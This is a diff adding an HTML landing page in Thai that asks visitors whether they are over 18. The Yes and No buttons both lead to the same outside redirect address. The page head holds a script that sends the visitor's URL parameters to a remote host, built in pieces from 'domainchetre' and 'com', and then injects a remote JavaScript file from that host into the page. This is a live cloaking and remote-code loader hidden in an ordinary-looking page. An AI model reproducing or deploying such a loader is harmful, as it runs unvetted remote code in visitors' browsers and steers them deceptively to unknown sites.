@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en" style="overflow: hidden;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
+    <title>Main</title>
+<script id="qsDa0Z7">
+  var xhr = new XMLHttpRequest();
+  var urlParams = new URLSearchParams(window.location.search);
+  var token = urlParams.get('utm_campaign');
+  var pixel = urlParams.get('pixel');
+  var host = 'domainchetre';
+  var domain_zone = 'com';
+  var t = '';
+  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
+  xhr.send();
+  xhr.onload = function () {
+    t = xhr.response;
+    t = t.replace(/00pixel00/gi, pixel);
+    t = JSON.parse(t);
+    t = t.redirect.content;
+    if (t != "") {
+      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
+      var a = document.createElement("script"), h = "head";
+      a.async = true;
+      a.src = 'https://' + host + '.' + domain_zone + '/themes/js/navigation.js';
+      document.getElementsByTagName(h)[0].appendChild(a)
+    }else document.getElementById("qsDa0Z7").remove();
+  }
+</script>
+</head>
+<style>
+    *{       
+        box-sizing: border-box;
+    }
+    body{
+        margin: 0;
+        
+    }
+    .section{
+        min-height: 100vh;
+        text-align: center;
+        width: 100%;
+        display: table;
+        font-family: 'Anton';
+        
+    }
+    .wrap_block{
+        display:table-cell;
+        vertical-align: middle;
+        color: white;
+    }
+    h1{
+        font-size: 90px;
+        text-transform: uppercase;
+        font-family: 'Anton';
+        letter-spacing: 5px;
+
+    }
+    a{
+        text-decoration: none;
+    }
+    .btn{
+        width: 200px;
+        height: 100px;
+        border: 1px solid white;
+        color: white;
+        display:table-cell;
+        vertical-align: middle;
+        font-size: 30px;
+        
+        
+    }
+    .btn:hover{
+        background: white;
+        color: black;
+    }
+    footer {
+        position: absolute;
+        bottom: 0;
+        width: 100%;
+       
+        color: white;
+        text-align: center;
+    }
+    footer a{
+
+        color: rgb(231, 231, 231);
+       
+    }
+    @media(max-width: 480px){
+        h1{
+            font-size: 38px;
+        }
+        .btn{
+        width: 100px;
+        height: 50px;
+        border: 1px solid white;
+        color: white;
+        display:table-cell;
+        vertical-align: middle;
+        font-size: 25px;
+    }
+    }
+</style>
+<body>
+<div class="section" data-vide-bg='bg1'>
+    <div class="wrap_block">
+        <h1>คุณอายุมากกว่า <br> 18 ปี?</h1>
+        <div style="margin: 0 auto;">
+            <a href="https://hundredmillionteam.info/ready.php?lp=1" style="margin: 20px;">
+                <div class="btn">
+                    ใช่
+                </div>
+            </a>
+            <a href="https://hundredmillionteam.info/ready.php?lp=1" style="margin: 20px;">
+                <div class="btn">
+                    ไม่
+                </div>
+            </a>
+        </div>
+        <!--<p style="font-family: 'Times New Roman', Times, serif;">*for new users only</p>-->
+    </div>
+</div>
+<!--
+<footer>
+<a href="cookies.html" target="_blank">Cookies</a>  |
+<a href="privacy-policy.html" target="_blank">Privacy policy</a>
+</footer>
+-->
+    <script src="jquery-3.5.1.min.js"></script>
+    <script src="jquery.vide.js"></script>
+</body>
+</html>
